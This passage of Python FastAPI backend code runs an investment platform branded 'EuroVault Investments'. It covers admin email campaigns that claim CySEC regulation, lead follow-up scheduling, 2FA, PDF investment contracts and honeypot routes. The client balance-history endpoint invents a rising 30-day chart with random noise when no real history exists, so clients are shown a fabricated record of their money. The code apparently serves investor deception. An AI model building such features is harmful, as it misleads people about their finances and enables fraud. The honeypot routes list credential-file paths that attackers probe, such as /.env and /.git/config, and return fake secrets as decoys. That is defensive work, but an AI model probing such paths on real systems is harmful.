    smtp_pass = os.environ.get("SMTP_PASS", "")
    smtp_from = os.environ.get("SMTP_FROM", smtp_user)

    if smtp_host and smtp_user and smtp_pass:
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            msg = MIMEMultipart("alternative")
            msg["Subject"] = req.subject
            msg["From"]    = f"EuroVault Investments <{smtp_from}>"
            msg["To"]      = recipient
            html_body = req.body.replace("\n", "<br>")
            html = f"""<html><body style="font-family:sans-serif;background:#06061a;color:#f3f5ff;padding:32px">
                <div style="max-width:560px;margin:0 auto;background:#111118;border:1px solid #26263a;border-radius:16px;padding:32px">
                    <img src="https://vault-invest.preview.emergentagent.com/logo-eurovault.png" height="48" alt="EuroVault"/>
                    <h2 style="color:#3A86FF;margin:20px 0 10px">{req.subject}</h2>
                    <div style="color:#e8eaf6;line-height:1.7">{html_body}</div>
                    <hr style="border-color:#26263a;margin:24px 0"/>
                    <p style="color:#4a5068;font-size:11px">EuroVault Investments · Regulamentado CySEC · Este email é confidencial.</p>
                </div></body></html>"""
            msg.attach(MIMEText(html, "html"))
            with smtplib.SMTP_SSL(smtp_host, 465) as s:
                s.login(smtp_user, smtp_pass)
                s.sendmail(smtp_from, [recipient], msg.as_string())
            email_log["status"] = "sent_smtp"
        except Exception as e:
            email_log["status"] = f"smtp_error: {str(e)[:100]}"
    else:
        email_log["status"] = "logged_only"

    await db.email_logs.insert_one(email_log)
    await log_admin_action(user_id, "email_sent", {"subject": req.subject, "to": recipient})

    return {
        "success": True,
        "to": recipient,
        "status": email_log["status"],
        "note": "Email registado. Configure SMTP_HOST, SMTP_USER, SMTP_PASS no .env para envio real."
    }

@app.get("/api/admin/users/{user_id}/email-logs")
async def get_email_logs(user_id: str, admin = Depends(get_admin_user)):
    logs = []
    async for e in db.email_logs.find({"user_id": user_id}).sort("sent_at", -1).limit(20):
        logs.append(serialize_doc({
            "id": e["_id"], "to": e.get("to"), "subject": e.get("subject"),
            "body": e.get("body","")[:200], "sent_at": e.get("sent_at"), "status": e.get("status")
        }))
    return logs


# ── Email para qualquer endereço (campanhas)
class GenericEmailRequest(BaseModel):
    to: str
    subject: str
    body: str
    recipient_name: Optional[str] = ""

@app.post("/api/admin/email/send")
async def send_generic_email(req: GenericEmailRequest, admin = Depends(get_admin_user)):
    """Envia email para qualquer endereço com assinatura profissional."""
    email_log = {
        "to": req.to, "subject": req.subject, "body": req.body,
        "sent_at": datetime.utcnow(), "status": "sent"
    }
    smtp_host = os.environ.get("SMTP_HOST", "")
    smtp_user = os.environ.get("SMTP_USER", "")
    smtp_pass = os.environ.get("SMTP_PASS", "")
    smtp_from = os.environ.get("SMTP_FROM", smtp_user)

    if smtp_host and smtp_user and smtp_pass:
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            msg = MIMEMultipart("alternative")
            msg["Subject"] = req.subject
            msg["From"]    = f"EuroVault Investments <{smtp_from}>"
            msg["To"]      = req.to
            html_body = req.body.replace("\n", "<br>")
            greeting = f"<p style='color:#7a8299;font-size:13px;margin:0 0 20px;'>Olá, <strong style='color:#f3f5ff;'>{req.recipient_name}</strong></p>" if req.recipient_name else ""
            html = f"""<html><body style="margin:0;padding:0;background:#06061a;font-family:'Helvetica Neue',Arial,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#06061a;padding:32px 16px;">
<tr><td align="center"><table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;">
<tr><td style="background:linear-gradient(135deg,#111118,#1a1a2e);border:1px solid #26263a;border-bottom:none;border-radius:16px 16px 0 0;padding:28px 32px;">
<span style="font-size:22px;font-weight:900;color:#f3f5ff;">EuroVault</span>
<span style="display:block;font-size:10px;color:#FFBE0B;font-weight:700;letter-spacing:0.15em;margin-top:2px;">INVESTMENTS</span>
</td></tr>
<tr><td style="background:#111118;border:1px solid #26263a;border-top:2px solid #3A86FF;padding:32px;color:#e8eaf6;">
{greeting}<div style="font-size:15px;line-height:1.75;">{html_body}</div>
</td></tr>
<tr><td style="background:#0a0a18;border:1px solid #26263a;border-top:none;border-radius:0 0 16px 16px;padding:20px 32px;">
<p style="margin:0 0 6px;font-size:13px;font-weight:700;color:#f3f5ff;">EuroVault Investments</p>
<p style="margin:0;font-size:11px;color:#4a5068;">Regulamentado pela CySEC · Licença 409/22 · MiFID II · ICF</p>
<hr style="border:none;border-top:1px solid #1a1a2a;margin:12px 0;">
<p style="margin:0;font-size:10px;color:#26263a;">© {datetime.utcnow().year} EuroVault Investments Ltd. Todos os direitos reservados.</p>
</td></tr>
</table></td></tr></table></body></html>"""
            msg.attach(MIMEText(html, "html"))
            with smtplib.SMTP_SSL(smtp_host, 465) as s:
                s.login(smtp_user, smtp_pass)
                s.sendmail(smtp_from, [req.to], msg.as_string())
            email_log["status"] = "sent_smtp"
        except Exception as e:
            email_log["status"] = f"error: {str(e)[:100]}"
    else:
        email_log["status"] = "logged_only"

    await db.email_logs.insert_one(email_log)
    return {"success": True, "to": req.to, "status": email_log["status"]}


# ════════════════════════════════════════════════════════════════
#  CALENDÁRIO DE FOLLOW-UPS
# ════════════════════════════════════════════════════════════════
@app.get("/api/admin/calendar")
async def get_calendar(month: Optional[int] = None, year: Optional[int] = None, admin = Depends(get_admin_user)):
    """Retorna todos os follow-ups agendados, opcionalmente filtrados por mês/ano."""
    now = datetime.utcnow()
    m = month or now.month
    y = year  or now.year
    # Primeiro e último dia do mês
    from calendar import monthrange
    first_day = datetime(y, m, 1)
    last_day  = datetime(y, m, monthrange(y, m)[1], 23, 59, 59)
    results = []
    async for u in db.users.find({"followup_date": {"$ne": None}}).sort("followup_date", 1):
        fd = u.get("followup_date")
        if not fd:
            continue
        try:
            # followup_date pode ser string ISO
            if isinstance(fd, str):
                fd_dt = datetime.fromisoformat(fd.replace("Z",""))
            else:
                fd_dt = fd
            if first_day <= fd_dt <= last_day:
                results.append({
                    "user_id": str(u["_id"]),
                    "full_name": u.get("full_name",""),
                    "email": u.get("email",""),
                    "phone": u.get("phone",""),
                    "followup_date": fd if isinstance(fd, str) else fd.isoformat(),
                    "followup_note": u.get("followup_note",""),
                    "status": u.get("status","Novo"),
                    "day": fd_dt.day,
                })
        except Exception:
            continue
    return {"month": m, "year": y, "events": results}


# ════════════════════════════════════════════════════════════════
#  BALANCE HISTORY para gráfico do cliente
# ════════════════════════════════════════════════════════════════
@app.get("/api/me/balance-history")
async def get_balance_history(current_user = Depends(get_current_user)):
    import random
    history = []
    async for h in db.balance_history.find({"user_id": current_user["sub"]}).sort("date", 1).limit(30):
        history.append({"date": h.get("date",""), "balance": h.get("balance",0), "profit": h.get("profit",0)})
    if not history:
        user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
        balance = float(user.get("balance", 0))
        profit  = float(user.get("profit", 0))
        now = datetime.utcnow()
        for i in range(29, -1, -1):
            d = now - timedelta(days=i)
            factor = max(0, (30 - i) / 30)
            noise = random.uniform(-0.02, 0.02) * balance * factor if balance > 0 else 0
            history.append({
                "date": d.strftime("%d/%m"),
                "balance": round(max(0, balance * factor + noise), 2),
                "profit":  round(max(0, profit * factor), 2)
            })
    return history


# ════════════════════════════════════════════════════════════════
#  2FA — AUTENTICAÇÃO DE DOIS FATORES (TOTP)
# ════════════════════════════════════════════════════════════════
import hashlib, time as time_module, struct, base64 as b64

def generate_totp_secret():
    return b64.b32encode(os.urandom(20)).decode()

def verify_totp(secret: str, code: str, window: int = 1) -> bool:
    try:
        import hmac as _hmac
        key = b64.b32decode(secret.upper())
        for offset in range(-window, window + 1):
            counter = int(time_module.time()) // 30 + offset
            msg = struct.pack(">Q", counter)
            h = _hmac.new(key, msg, hashlib.sha1).digest()
            ov = h[-1] & 0x0f
            otp = struct.unpack(">I", h[ov:ov+4])[0] & 0x7fffffff
            if str(otp % 1000000).zfill(6) == str(code):
                return True
    except Exception:
        pass
    return False

class TwoFASetupResponse(BaseModel):
    secret: str
    uri: str

class TwoFACodeRequest(BaseModel):
    code: str

@app.post("/api/me/2fa/setup")
async def setup_2fa(current_user = Depends(get_current_user)):
    secret = generate_totp_secret()
    await db.users.update_one({"_id": ObjectId(current_user["sub"])}, {"$set": {"totp_secret_pending": secret}})
    email = current_user.get("email", "user")
    uri = f"otpauth://totp/EuroVault:{email}?secret={secret}&issuer=EuroVault"
    return {"secret": secret, "uri": uri}

@app.post("/api/me/2fa/confirm")
async def confirm_2fa(req: TwoFACodeRequest, current_user = Depends(get_current_user)):
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    secret = user.get("totp_secret_pending")
    if not secret or not verify_totp(secret, req.code):
        raise HTTPException(status_code=400, detail="Código inválido. Verifique a app autenticadora.")
    await db.users.update_one({"_id": ObjectId(current_user["sub"])}, {
        "$set": {"totp_secret": secret, "two_fa_enabled": True},
        "$unset": {"totp_secret_pending": ""}
    })
    return {"success": True}

@app.post("/api/me/2fa/disable")
async def disable_2fa(req: TwoFACodeRequest, current_user = Depends(get_current_user)):
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    secret = user.get("totp_secret")
    if not secret or not verify_totp(secret, req.code):
        raise HTTPException(status_code=400, detail="Código inválido")
    await db.users.update_one({"_id": ObjectId(current_user["sub"])}, {
        "$set": {"two_fa_enabled": False}, "$unset": {"totp_secret": ""}
    })
    return {"success": True}


# ════════════════════════════════════════════════════════════════
#  FAVORITOS NA TRADE
# ════════════════════════════════════════════════════════════════
class FavoritesRequest(BaseModel):
    favorites: List[str]

@app.put("/api/me/favorites")
async def set_favorites(req: FavoritesRequest, current_user = Depends(get_current_user)):
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"favorites": req.favorites}}
    )
    return {"success": True}


# ════════════════════════════════════════════════════════════════
#  HEALTH
# ════════════════════════════════════════════════════════════════
@app.get("/api/health")
async def health():
    return {"status": "ok", "service": "BrokerEurope API"}


# ════════════════════════════════════════════════════════════════
#  HONEYPOTS — Rotas falsas para exercício CTF
# ════════════════════════════════════════════════════════════════
_honeypot_log: list = []

async def log_honeypot(request: FastAPIRequest, path: str):
    ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
    entry = {
        "ts": datetime.utcnow().isoformat(), "path": path,
        "ip": ip.split(",")[0].strip(),
        "user_agent": request.headers.get("user-agent", ""),
        "method": request.method,
    }
    _honeypot_log.append(entry)
    try:
        await db.honeypot_logs.insert_one(entry)
    except Exception:
        pass

@app.get("/phpmyadmin")
@app.get("/phpmyadmin/index.php")
@app.post("/phpmyadmin")
async def hp_phpmyadmin(request: FastAPIRequest):
    await log_honeypot(request, "/phpmyadmin")
    return JSONResponse({"error": "Access Denied"}, status_code=403)

@app.get("/wp-admin")
@app.get("/wp-login.php")
@app.post("/wp-login.php")
async def hp_wordpress(request: FastAPIRequest):
    await log_honeypot(request, "/wp-admin")
    return JSONResponse({"error": "Not Found"}, status_code=404)

@app.get("/.env")
@app.get("/config.php")
@app.get("/config.json")
@app.get("/.git/config")
async def hp_config(request: FastAPIRequest):
    await log_honeypot(request, "/.env")
    return JSONResponse({
        "DB_HOST": "127.0.0.1", "DB_USER": "admin",
        "DB_PASS": "changeme_fake", "APP_SECRET": "ctf_fake_key_honeypot",
        "API_KEY": "sk_live_THIS_IS_FAKE_honeypot"
    }, status_code=200)

@app.get("/admin")
@app.get("/administrator")
@app.get("/panel")
async def hp_admin(request: FastAPIRequest):
    await log_honeypot(request, "/admin-panel")
    return JSONResponse({"error": "Forbidden"}, status_code=403)

@app.get("/backup.sql")
@app.get("/database.sql")
@app.get("/dump.sql")
async def hp_backup(request: FastAPIRequest):
    await log_honeypot(request, "/backup.sql")
    return JSONResponse("", status_code=404)

@app.get("/api/v1/config")
@app.get("/api/config")
async def hp_api_config(request: FastAPIRequest):
    await log_honeypot(request, "/api/config")
    return JSONResponse({
        "api_key": "sk_live_CTF_THIS_IS_FAKE_2025",
        "env": "production", "debug": False
    }, status_code=200)

@app.get("/api/admin/honeypot-logs")
async def get_honeypot_logs(admin = Depends(get_admin_user)):
    """Admin vê quem tentou aceder às rotas falsas."""
    return list(reversed(_honeypot_log))[-50:]


# ════════════════════════════════════════════════════════════════
#  ANTI-ENUMERAÇÃO: 404 genérico para rotas desconhecidas
import uuid as uuid_lib

# ════════════════════════════════════════════════════════════════
#  SISTEMA DE CONTRATOS
# ════════════════════════════════════════════════════════════════

DEFAULT_CONTRACT_TEMPLATE = """CONTRATO DE INVESTIMENTO

Entre a empresa {{empresa_nome}}, com sede em {{empresa_morada}}, NIF {{empresa_nif}}, adiante designada por "Empresa",

e o(a) Sr.(a) {{nome_completo}}, portador(a) do documento {{documento}}, residente em {{morada}}, e-mail {{email}}, telefone {{telefone}}, adiante designado(a) por "Cliente",

é celebrado o presente Contrato de Investimento, nos termos e condições seguintes:

CLÁUSULA 1.ª — OBJETO DO CONTRATO
O presente contrato tem por objeto a prestação de serviços de investimento por parte da Empresa ao Cliente, no montante de {{valor_investimento}} euros.

CLÁUSULA 2.ª — DURAÇÃO
O presente contrato entra em vigor na data da sua assinatura, {{data}}, e vigorará pelo prazo acordado entre as partes.

CLÁUSULA 3.ª — OBRIGAÇÕES DA EMPRESA
A Empresa compromete-se a gerir os fundos do Cliente de forma diligente, em conformidade com a legislação aplicável, e a fornecer relatórios periódicos sobre a evolução do investimento.

CLÁUSULA 4.ª — OBRIGAÇÕES DO CLIENTE
O Cliente compromete-se a fornecer informações verdadeiras e completas, e a cumprir com os requisitos de identificação exigidos pela lei.

CLÁUSULA 5.ª — RISCO
O Cliente reconhece que os investimentos envolvem riscos e que os resultados passados não garantem resultados futuros. A Empresa não garante qualquer rendimento mínimo.

CLÁUSULA 6.ª — CONFIDENCIALIDADE
Ambas as partes comprometem-se a manter a confidencialidade de todas as informações trocadas no âmbito do presente contrato.

CLÁUSULA 7.ª — LEI APLICÁVEL
O presente contrato é regido pela lei portuguesa, sendo competente o Tribunal da Comarca de Lisboa para a resolução de eventuais litígios.

Data: {{data}}

Assinatura do Cliente: {{assinatura_nome}}"""

class CompanySettingsRequest(BaseModel):
    name: str = "EuroVault Investments"
    address: str = ""
    tax_number: str = ""
    email: str = ""
    phone: str = ""
    legal_text: str = ""
    logo_b64: Optional[str] = ""

class ContractTemplateRequest(BaseModel):
    name: str
    content: str
    description: Optional[str] = ""

class GenerateContractRequest(BaseModel):
    template_id: str
    lead_id: Optional[str] = None
    preset_name: Optional[str] = ""
    preset_email: Optional[str] = ""

class ContractSubmitRequest(BaseModel):
    nome_completo: str
    email: str
    telefone: str
    documento: str
    valor_investimento: str
    data_contrato: str
    morada: Optional[str] = ""
    aceite_termos: bool
    signature_name: Optional[str] = ""
    signature_image: Optional[str] = ""  # base64 canvas

def generate_pdf_bytes(company: dict, contract_data: dict, processed_content: str,
                        signature_name: str, signature_image: Optional[str] = None) -> bytes:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable, Image
    from reportlab.pdfgen import canvas as pdfcanvas
    from reportlab.lib import colors
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY, TA_RIGHT
    from io import BytesIO as BIO
    import base64 as b64

    NAVY   = colors.HexColor('#0d1b2a')
    GOLD   = colors.HexColor('#C9A84C')
    GOLD2  = colors.HexColor('#E8C96A')
    LIGHT  = colors.HexColor('#f7f8ff')
    MID    = colors.HexColor('#5a6280')
    ACCENT = colors.HexColor('#1e3a5f')
    WHITE  = colors.white

    buf = BIO()
    W, H = A4
    logo_b64 = company.get("logo_b64", "")

    def add_page_decoration(canv, doc):
        canv.saveState()
        # Background
        canv.setFillColor(colors.HexColor('#f9faff'))
        canv.rect(0, 0, W, H, fill=1, stroke=0)

        # Outer gold border frame
        canv.setStrokeColor(GOLD)
        canv.setLineWidth(1.2)
        canv.rect(0.65*cm, 0.65*cm, W-1.3*cm, H-1.3*cm, fill=0, stroke=1)
        # Inner thin navy line
        canv.setStrokeColor(NAVY)
        canv.setLineWidth(0.3)
        canv.rect(0.85*cm, 0.85*cm, W-1.7*cm, H-1.7*cm, fill=0, stroke=1)

        # Top gold bar
        canv.setFillColor(NAVY)
        canv.rect(0.65*cm, H-0.65*cm, W-1.3*cm, -1.1*cm, fill=1, stroke=0)
        # Gold accent stripe on top bar
        canv.setFillColor(GOLD)
        canv.rect(0.65*cm, H-0.65*cm-0.12*cm, W-1.3*cm, 0.12*cm, fill=1, stroke=0)

        # Bottom bar
        canv.setFillColor(NAVY)
        canv.rect(0.65*cm, 0.65*cm, W-1.3*cm, 0.9*cm, fill=1, stroke=0)
        canv.setFillColor(GOLD)
        canv.rect(0.65*cm, 1.55*cm-0.08*cm, W-1.3*cm, 0.08*cm, fill=1, stroke=0)

        # Company name in top bar
        canv.setFillColor(WHITE)
        canv.setFont('Helvetica-Bold', 10)
        canv.drawCentredString(W/2, H-0.65*cm-0.7*cm, company.get("name","EuroVault Investments").upper())
        canv.setFillColor(GOLD2)
        canv.setFont('Helvetica', 7)
        canv.drawCentredString(W/2, H-0.65*cm-0.95*cm,
            " · ".join(filter(None, [company.get("address",""), company.get("tax_number","")])))

        # Page number in bottom bar
        canv.setFillColor(GOLD2)
        canv.setFont('Helvetica', 7)
        canv.drawCentredString(W/2, 0.65*cm+0.28*cm, f"Página {canv.getPageNumber()}")
        canv.setFillColor(WHITE)
        ref = contract_data.get("token","")[:16].upper()
        canv.setFont('Helvetica', 6.5)
        canv.drawString(0.9*cm, 0.65*cm+0.28*cm, f"REF: {ref}")
        canv.drawRightString(W-0.9*cm, 0.65*cm+0.28*cm, "Documento Confidencial")

        # ── Watermark (logo at very low opacity in center) ──
        if logo_b64:
            try:
                raw = b64.b64decode(logo_b64.split(",")[-1])
                img_buf = BIO(raw)
                canv.saveState()
                # Apply transparency via setFillAlpha (reportlab 4+)
                try:
                    canv.setFillAlpha(0.04)
                    canv.drawImage(img_buf, W/2-4*cm, H/2-4*cm, width=8*cm, height=8*cm,
                                   mask='auto', preserveAspectRatio=True)
                except Exception:
                    pass
                canv.restoreState()
            except Exception:
                pass
        else:
            # Text watermark if no logo
            canv.saveState()
            canv.setFont('Helvetica-Bold', 52)
            canv.setFillColor(colors.HexColor('#0d1b2a'))
            try:
                canv.setFillAlpha(0.04)
            except Exception:
                pass
            canv.translate(W/2, H/2)
            canv.rotate(35)
            canv.drawCentredString(0, 0, company.get("name","EUROVAULT").upper())
            canv.restoreState()

        canv.restoreState()

    doc = SimpleDocTemplate(buf, pagesize=A4,
        rightMargin=2.0*cm, leftMargin=2.0*cm, topMargin=2.8*cm, bottomMargin=2.4*cm)

    styles = getSampleStyleSheet()
    def sty(name, **kw):
        return ParagraphStyle(name, parent=styles['Normal'], **kw)

    s_contract_title = sty('CT', fontSize=17, fontName='Helvetica-Bold',
        alignment=TA_CENTER, textColor=NAVY, spaceAfter=3, spaceBefore=4)
    s_ref = sty('Ref', fontSize=9, fontName='Helvetica',
        alignment=TA_CENTER, textColor=MID, spaceAfter=2)
    s_section = sty('Sec', fontSize=10, fontName='Helvetica-Bold',
        textColor=NAVY, spaceAfter=4, spaceBefore=8)
    s_body = sty('Bod', fontSize=9.5, fontName='Helvetica', leading=15,
        alignment=TA_JUSTIFY, textColor=colors.HexColor('#1a1a2e'), spaceAfter=5)
    s_clause_title = sty('CL', fontSize=9.5, fontName='Helvetica-Bold',
        textColor=ACCENT, spaceAfter=3, spaceBefore=6)
    s_sign = sty('Sig', fontSize=14, fontName='Helvetica-BoldOblique',
        alignment=TA_CENTER, textColor=NAVY)
    s_sign_label = sty('SL', fontSize=8, fontName='Helvetica',
        alignment=TA_CENTER, textColor=MID)
    s_footer_legal = sty('FL', fontSize=7, fontName='Helvetica',
        alignment=TA_CENTER, textColor=MID)

    story = []

    # ── Logo (if present) ──
    if logo_b64:
        try:
            raw = b64.b64decode(logo_b64.split(",")[-1])
            img_buf = BIO(raw)
            logo_img = Image(img_buf, width=2.5*cm, height=2.5*cm)
            logo_img.hAlign = 'CENTER'
            story.append(logo_img)
            story.append(Spacer(1, 0.2*cm))
        except Exception:
            pass

    # ── Gold divider ──
    story.append(HRFlowable(width="100%", thickness=1.5, color=GOLD, spaceAfter=8, spaceBefore=2))

    # ── Contract Title ──
    story.append(Paragraph("CONTRATO DE INVESTIMENTO", s_contract_title))
    story.append(Paragraph("INVESTMENT AGREEMENT", sty('CT2', fontSize=9, fontName='Helvetica',
        alignment=TA_CENTER, textColor=colors.HexColor('#9ca3c0'), spaceAfter=6)))

    ref_id = contract_data.get("token","")[:16].upper()
    date_str = contract_data.get("data_contrato", datetime.utcnow().strftime('%d/%m/%Y'))
    story.append(Paragraph(f"Ref.: {ref_id}   |   Data: {date_str}", s_ref))

    story.append(HRFlowable(width="100%", thickness=0.5, color=GOLD, spaceAfter=8))
    story.append(Spacer(1, 0.3*cm))

    # ── Client & Company table ──
    cd = contract_data
    data_table = [
        [Paragraph("DADOS DO CLIENTE", sty('TH', fontSize=9, fontName='Helvetica-Bold', textColor=WHITE)),
         Paragraph("DADOS DA EMPRESA", sty('TH2', fontSize=9, fontName='Helvetica-Bold', textColor=WHITE))],
        [
            Table([
                [Paragraph("<b>Nome:</b>", sty('td', fontSize=8.5, fontName='Helvetica', textColor=NAVY)),
                 Paragraph(cd.get("nome_completo",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Email:</b>", sty('td', fontSize=8.5, fontName='Helvetica', textColor=NAVY)),
                 Paragraph(cd.get("email",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Telefone:</b>", sty('td', fontSize=8.5, fontName='Helvetica', textColor=NAVY)),
                 Paragraph(cd.get("telefone",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Documento:</b>", sty('td', fontSize=8.5, fontName='Helvetica', textColor=NAVY)),
                 Paragraph(cd.get("documento",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Morada:</b>", sty('td', fontSize=8.5, fontName='Helvetica', textColor=NAVY)),
                 Paragraph(cd.get("morada","—"), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Investimento:</b>", sty('td', fontSize=8.5, fontName='Helvetica', textColor=GOLD)),
                 Paragraph(f"€ {cd.get('valor_investimento','')}",
                           sty('td2g', fontSize=9, fontName='Helvetica-Bold', textColor=GOLD))],
            ], colWidths=[2.2*cm, 6*cm],
               style=TableStyle([
                   ('TOPPADDING',(0,0),(-1,-1),3), ('BOTTOMPADDING',(0,0),(-1,-1),3),
                   ('LEFTPADDING',(0,0),(-1,-1),4), ('RIGHTPADDING',(0,0),(-1,-1),4),
               ])),

            Table([
                [Paragraph("<b>Empresa:</b>", sty('td', fontSize=8.5, textColor=NAVY)),
                 Paragraph(company.get("name",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Morada:</b>", sty('td', fontSize=8.5, textColor=NAVY)),
                 Paragraph(company.get("address",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>NIF:</b>", sty('td', fontSize=8.5, textColor=NAVY)),
                 Paragraph(company.get("tax_number",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Email:</b>", sty('td', fontSize=8.5, textColor=NAVY)),
                 Paragraph(company.get("email",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph("<b>Telefone:</b>", sty('td', fontSize=8.5, textColor=NAVY)),
                 Paragraph(company.get("phone",""), sty('td2', fontSize=8.5, textColor=NAVY))],
                [Paragraph(""), Paragraph("")],
            ], colWidths=[2.2*cm, 5.3*cm],
               style=TableStyle([
                   ('TOPPADDING',(0,0),(-1,-1),3), ('BOTTOMPADDING',(0,0),(-1,-1),3),
                   ('LEFTPADDING',(0,0),(-1,-1),4), ('RIGHTPADDING',(0,0),(-1,-1),4),
               ])),
        ]
    ]
    outer = Table(data_table, colWidths=[8.5*cm, 8.5*cm])
    outer.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), NAVY),
        ('TEXTCOLOR', (0,0), (-1,0), WHITE),
        ('ALIGN', (0,0), (-1,0), 'CENTER'),
        ('TOPPADDING', (0,0), (-1,0), 7), ('BOTTOMPADDING', (0,0), (-1,0), 7),
        ('LEFTPADDING', (0,0), (-1,-1), 8), ('RIGHTPADDING', (0,0), (-1,-1), 8),
        ('TOPPADDING', (0,1), (-1,-1), 8), ('BOTTOMPADDING', (0,1), (-1,-1), 8),
        ('BACKGROUND', (0,1), (0,1), colors.HexColor('#f0f4ff')),
        ('BACKGROUND', (1,1), (1,1), colors.HexColor('#f7f8ff')),
        ('GRID', (0,0), (-1,-1), 0.5, GOLD),
        ('LINEBELOW', (0,0), (-1,0), 2, GOLD),
    ]))
    story.append(outer)
    story.append(Spacer(1, 0.5*cm))

    # ── Contract Body ──
    story.append(HRFlowable(width="100%", thickness=0.5, color=GOLD, spaceAfter=6))
    in_clause = False
    for line in processed_content.split('\n'):
        stripped = line.strip()
        if stripped == '':
            story.append(Spacer(1, 0.15*cm))
        elif stripped.upper() == stripped and len(stripped) < 80 and len(stripped) > 3:
            # Section heading
            story.append(Paragraph(stripped, s_clause_title))
            in_clause = True
        else:
            safe = stripped.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            story.append(Paragraph(safe, s_body))

    story.append(Spacer(1, 0.6*cm))
    story.append(HRFlowable(width="100%", thickness=1, color=GOLD, spaceAfter=6))
    story.append(Spacer(1, 0.4*cm))

    # ── Signature Section ──
    # Client signature cell
    if signature_image and signature_image.startswith("data:image"):
        try:
            raw = b64.b64decode(signature_image.split(",")[-1])
            sig_buf = BIO(raw)
            sig_img = Image(sig_buf, width=5*cm, height=1.8*cm)
            client_content = [sig_img, Spacer(1, 0.1*cm), Paragraph(signature_name or "", s_sign_label)]
        except Exception:
            client_content = [Paragraph(signature_name or "Assinado digitalmente", s_sign),
                              Spacer(1, 0.1*cm), Paragraph("Assinatura digital", s_sign_label)]
    else:
        client_content = [
            Spacer(1, 0.2*cm),
            Paragraph(signature_name or "Assinado digitalmente", s_sign),
            Spacer(1, 0.1*cm),
            Paragraph("Assinatura do Cliente", s_sign_label)
        ]

    company_content = [
        Spacer(1, 0.2*cm),
        Paragraph("_________________________", s_sign),
        Spacer(1, 0.05*cm),
        Paragraph(company.get("name",""), s_sign_label),
        Paragraph("Representante Autorizado", sty('RA', fontSize=7, fontName='Helvetica', alignment=TA_CENTER, textColor=MID))
    ]

    sig_header = [
        Paragraph("ASSINATURA DO CLIENTE", sty('SH', fontSize=8, fontName='Helvetica-Bold', alignment=TA_CENTER, textColor=WHITE)),
        Paragraph("ASSINATURA DA EMPRESA", sty('SH2', fontSize=8, fontName='Helvetica-Bold', alignment=TA_CENTER, textColor=WHITE))
    ]

    sig_table = Table([[sig_header[0], sig_header[1]], [client_content, company_content]],
                      colWidths=[8.5*cm, 8.5*cm])
    sig_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), NAVY),
        ('LINEBELOW', (0,0), (-1,0), 1.5, GOLD),
        ('GRID', (0,0), (-1,-1), 0.5, GOLD),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('TOPPADDING', (0,0), (-1,0), 7), ('BOTTOMPADDING', (0,0), (-1,0), 7),
        ('TOPPADDING', (0,1), (-1,-1), 12), ('BOTTOMPADDING', (0,1), (-1,-1), 14),
        ('BACKGROUND', (0,1), (0,1), colors.HexColor('#f0f4ff')),
        ('BACKGROUND', (1,1), (1,1), colors.HexColor('#f7f8ff')),
    ]))
    story.append(sig_table)
    story.append(Spacer(1, 0.5*cm))

    # ── Legal footer ──
    legal = company.get("legal_text","") or "Documento gerado e assinado electronicamente. Este contrato tem validade legal."
    story.append(Paragraph(legal, s_footer_legal))

    doc.build(story, onFirstPage=add_page_decoration, onLaterPages=add_page_decoration)
    return buf.getvalue()

# ── Company Settings
@app.get("/api/admin/company-settings")
async def get_company_settings(admin = Depends(get_admin_user)):
    s = await db.company_settings.find_one({}, {"_id": 0})
    if not s:
        return {"name":"EuroVault Investments","address":"Av. da Liberdade 110, Lisboa, Portugal",
                "tax_number":"PT123456789","email":"suporte@eurovault.eu",
                "phone":"+351 21 000 0000","legal_text":"","logo_b64":""}
    return s

@app.put("/api/admin/company-settings")
async def update_company_settings(req: CompanySettingsRequest, admin = Depends(get_admin_user)):
    await db.company_settings.update_one({}, {"$set": req.dict()}, upsert=True)
    return {"success": True}

# ── Contract Templates
@app.get("/api/admin/contract-templates")
async def list_contract_templates(admin = Depends(get_admin_user)):
    templates = []
    async for t in db.contract_templates.find({}).sort("created_at", -1):
        templates.append(serialize_doc({"id": t["_id"], "name": t.get("name"),
            "description": t.get("description",""), "content": t.get("content",""),
            "created_at": t.get("created_at")}))
    return templates

@app.post("/api/admin/contract-templates")
async def create_contract_template(req: ContractTemplateRequest, admin = Depends(get_admin_user)):
    result = await db.contract_templates.insert_one({
        "name": req.name, "description": req.description,
        "content": req.content, "created_at": datetime.utcnow()
    })
    return {"success": True, "id": str(result.inserted_id)}

@app.put("/api/admin/contract-templates/{template_id}")
async def update_contract_template(template_id: str, req: ContractTemplateRequest, admin = Depends(get_admin_user)):
    await db.contract_templates.update_one({"_id": ObjectId(template_id)},
        {"$set": {"name": req.name, "description": req.description,
                  "content": req.content, "updated_at": datetime.utcnow()}})
    return {"success": True}

@app.delete("/api/admin/contract-templates/{template_id}")
async def delete_contract_template(template_id: str, admin = Depends(get_admin_user)):
